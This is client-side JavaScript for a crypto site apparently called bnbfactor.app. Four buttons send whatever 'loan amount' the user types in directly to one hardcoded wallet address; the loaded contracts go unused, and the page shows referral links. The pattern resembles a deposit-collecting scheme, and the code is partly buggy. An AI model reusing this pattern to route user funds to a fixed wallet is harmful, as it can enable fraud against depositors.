
const ethereumButton = document.querySelector('.enableEthereumButton');
const sendEthButton = document.querySelector('.sendEthButton');
const sendEthButton2 = document.querySelector('.sendEthButton2');
const sendEthButton3 = document.querySelector('.sendEthButton3');
const sendEthButton4 = document.querySelector('.sendEthButton4');

let accounts = [];
var web3 = new Web3(window.ethereum);


sendEthButton.addEventListener('click', () => {
  let x = document.getElementById("loanAmtInput").value;
  ethereum
    .request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: accounts[0],
          to: '0xa82E87a0Bd2D812275ef6d661b4F67Ce332721db',
          value: parseInt(web3.utils.toWei(x, 'ether')).toString(16),
          gas: '0x4B0',
          gasPrice: '0x48C27395000',
        },
      ],
    })
    .then((txHash) => console.log(txHash))
    .catch((error) => console.error);
});

sendEthButton2.addEventListener('click', () => {
  let x2 = document.getElementById("loanAmtInput2").value;
  ethereum
    .request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: accounts[0],
          to: '0xa82E87a0Bd2D812275ef6d661b4F67Ce332721db',
          value: parseInt(web3.utils.toWei(x2, 'ether')).toString(16),
          gas: '0x4B0',
          gasPrice: '0x48C27395000',
        },
      ],
    })
    .then((txHash) => console.log(txHash))
    .catch((error) => console.error);
});

sendEthButton3.addEventListener('click', () => {
  let x3 = document.getElementById("loanAmtInput3").value;
  ethereum
    .request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: accounts[0],
          to: '0xa82E87a0Bd2D812275ef6d661b4F67Ce332721db',
          value: parseInt(web3.utils.toWei(x3, 'ether')).toString(16),
          gas: '0x4B0',
          gasPrice: '0x48C27395000',
        },
      ],
    })
    .then((txHash) => console.log(txHash))
    .catch((error) => console.error);
});

sendEthButton4.addEventListener('click', () => {
  let x4 = document.getElementById("loanAmtInput4").value;
  ethereum
    .request({
      method: 'eth_sendTransaction',
      params: [
        {
          from: accounts[0],
          to: '0xa82E87a0Bd2D812275ef6d661b4F67Ce332721db',
          value: parseInt(web3.utils.toWei(x4, 'ether')).toString(16),
          gas: '0x4B0',
          gasPrice: '0x48C27395000',
        },
      ],
    })
    .then((txHash) => console.log(txHash))
    .catch((error) => console.error);
});

ethereumButton.addEventListener('click', () => {
  getAccount();
});

async function getAccount() {
  accounts = await ethereum.request({ method: 'eth_requestAccounts' });
}

async function myaddress() {
  accounts = await ethereum.request({ method: 'eth_requestAccounts' })

  document.getElementById("fullacc").innerHTML = accounts[0];
  document.getElementById("refacc").innerHTML = "https://bnbfactor.app/?r=" + accounts[0].substring(0, 3) + "...";
  var acc1 = accounts[0].substring(0, 6);
  var acc2 = accounts[0].substring(44, 38);
  document.getElementById("myacc").innerHTML = acc1 + "..." + acc2;
}

async function loadWeb3() {

  if (window.ethereum) 
  {
      if (window.web3 = new Web3(window.ethereum), "true"=="true"){
          await window.ethereum.enable();
      }
  } 
  
  else if (window.web3, "true"=="true") 
  {
      window.web3 = new Web3(window.web3.currentProvider);
  } 
  
  else 
  {
      window.alert('Non-Ethereum browser detected. Please install MetaMask.');
      return;
  }
  
  const networkId = await web3.eth.net.getId();
  const chainId = await web3.eth.getChainId();
  window.isBnb = false;
  if (networkId == 56 && chainId == 56) {
      window.contract = new window.web3.eth.Contract(bnbContractDetails.abi, bnbContractDetails.address);
      window.isBnb = true;
  } else if (networkId == 1 && chainId == 1) {
      window.contract = new window.web3.eth.Contract(contractDetails.abi, contractDetails.address);
  } else {
      return alert('Unsupported network detected. Select a supported network in MetaMask and reload the page. \n\nSupported networks:\n- Ethereum Mainnet \n- Binance Smart Chain Mainnet');
  }
  if (!window.contract) return alert('Error loading contract data');
  return window.web3.eth.getAccounts();
}

function copyRef(id)
{
var r = document.createRange();
r.selectNode(document.getElementById("input"));
window.getSelection().removeAllRanges();
window.getSelection().addRange(r);
document.execCommand('copy');
window.getSelection().removeAllRanges();
}

function bscHttpObject() {
    try {
        return new XMLHttpRequest();
    } catch (error) {}
}

function bscGetData() {
    var request = bscHttpObject();
    request.open("GET", "https://api.cryptonator.com/api/ticker/bnb-usd", false);
    request.send(null);
    console.log(request.responseText);
    return request.responseText;
}

function bscDataHandler() {
    var raw_data_string = bscGetData();
    var data = JSON.parse(raw_data_string);
    var base = data.ticker.base;
    var target = data.ticker.target;
    var price = data.ticker.price;
    var volume = data.ticker.volume;
    var change = data.ticker.change;
    var api_server_epoch_timestamp = data.timestamp;
    var api_success = data.success;
    var api_error = data.error;
    var volume_price = data.ticker.price * data.ticker.volume;
    return price;
}

function bscdata() {
  var liquidity_bnb = Math.round(bscDataHandler());

  tvd_bnb = document.getElementById("bsc_amount").innerHTML;
  let tvd = parseFloat(tvd_bnb.replace(/[^0-9\.]+/g, ""));
  document.getElementById("bnb_val").innerHTML = "$ " + (liquidity_bnb * tvd).toFixed(2);

  tvd_earn = document.getElementById("bsc_earn").innerHTML;
  let tvde = parseFloat(tvd_earn.replace(/[^0-9\.]+/g, ""));
  document.getElementById("bnb_vel").innerHTML = "$ " + (liquidity_bnb * tvde).toFixed(2);
}
